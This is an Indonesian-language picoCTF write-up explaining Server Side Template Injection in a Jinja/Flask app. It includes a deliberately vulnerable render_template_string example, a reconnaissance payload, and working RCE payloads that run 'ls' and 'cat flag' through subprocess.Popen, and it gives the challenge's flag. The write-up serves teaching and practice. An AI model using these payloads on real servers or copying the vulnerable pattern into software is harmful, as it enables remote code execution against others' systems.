<img width="940" height="672" alt="image" src="https://github.com/user-attachments/assets/32ff9511-8656-4d38-860c-cdd7a1b7c82b" />

Jadi Chall ini memberitahu kita kalau ini adalah kerentanan SSTI atau _Server Side Template Injection_. Jadi dalam pembuatan web ini menggunakan sebuah template engine. Template engine ini memiliki sebuah kerentanan dimana ia menggabungkan input pengguna dengan tampilan halaman yang akan ditampilkan. Jadi setiap kita memberikan input code maka template engine akan berpikir bahwa ini code yang harus dieksekusi karena input atau data dan tampilan tidak dipisah. Sebagai contoh: <br>

```
def home():
    # 1. Ambil input dari parameter URL (?text=...)
    user_input = request.args.get('text', 'Halo! Coba tambahkan ?text=payload_SSTI_anda')

    # 2. Siapkan template HTML sebagai string
    html_template = f"""
    <!doctype html>
    <title>Lab SSTI Rentan</title>
    <body style="background-color:#333; color:white; font-size: 24px;">
        <h1>Selamat Datang di Lab SSTI</h1>
        <p>Input terakhir kamu:</p>
        <hr>
        {user_input}
        <hr>
    </body>
    </html>
    """

    # 3. == CELAH KERENTANAN ==
    # Bukannya menampilkan 'user_input' sebagai data,
    # kita malah MENGEVALUASI seluruh template dengan input di dalamnya.
    return render_template_string(html_template)
```
<br><br>
<img width="1918" height="1048" alt="image" src="https://github.com/user-attachments/assets/b2ebcaea-78f8-40bd-8503-f8e5fe283dec" />

Untuk memastikan kalau template engine ini menggunakan bahasa apa, kita bisa coba input **{{ "A"*7 }}**. Jika ini python (Django/Jinja) maka dia akan mencetak A sebanyak 7 kali.
<br><br>
<img width="1919" height="800" alt="image" src="https://github.com/user-attachments/assets/7edc05fa-f965-4afa-9e32-8814ac7b5395" />

Ternyata benar. Tercetak 7 kali. Dari sini kita bisa coba payloads 
```
{{ ''.__class__.__mro__[1].__subclasses__() }}
```
"Payload ini adalah untuk reconnaissance (pengintaian). Tujuannya adalah untuk mendapatkan daftar semua kelas yang sedang berjalan di server.
1. Kita mulai dengan '', sebuah instance (contoh) dari objek string. Kita bisa pakai ini karena ini adalah cara termudah untuk mendapatkan "pijakan" di server.
2. Kita ambil kelasnya (.__class__) untuk mendapatkan <class 'str'>.
3. Kita ambil "silsilah keluarganya" (.__mro__) yang mengembalikan tuple silsilah: (<class 'str'>, <class 'object'>).
4. Kita ambil item kedua dari tuple itu ([1Next]) untuk mendapatkan induk kelas utamanya: <class 'object'>, si "Kakek Buyut" dari semua kelas di Python.
5. Terakhir, kita panggil .__subclasses__() pada object untuk memintanya mendaftarkan semua "keturunannya" (subclass) yang sedang aktif.

Hasilnya adalah daftar panjang berisi ratusan kelas, yang kemudian bisa kita cari untuk 'alat' berbahaya seperti subprocess.Popen untuk RCE."
<br><br>

<img width="1847" height="731" alt="image" src="https://github.com/user-attachments/assets/1f03f1e1-3134-42bb-8c4d-542480a92955" />
Next target yang akan dicari adalah _subprocess.Popen_ untuk menjalankan RCE dan dari situ nanti kita bisa coba "ls" untuk cek list isi direktori dan jika bertemu "flag" bisa kita "cat" untuk baca flagnya. Untuk mencari _subprocess.Popen_ aku melakukan slicing list dan berhasil menemukan di index ke 356

```
// ini  index dari subprocess.Popen
{{ ''.__class__.__mro__[1].__subclasses__()[356] }}

// ini untuk cek list dari direktorinya
{{ ''.__class__.__mro__[1].__subclasses__()[356]('ls', shell=True, stdout=-1).communicate()[0] }}
```
Coba inject dan akan ada beberapa list file
<br><br>
<img width="708" height="195" alt="image" src="https://github.com/user-attachments/assets/4ebcd05a-058a-4a93-9e7d-b41665576e0d" />

Contoh disini kita berhasil menemukan flagnya. Hanya perlu satu command lagi untuk RCE nya

```
{{ ''.__class__.__mro__[1].__subclasses__()[356]('cat flag', shell=True, stdout=-1).communicate()[0] }}
```
Dan kita berhasil dapat flagnya: **picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bdc95c1a}**
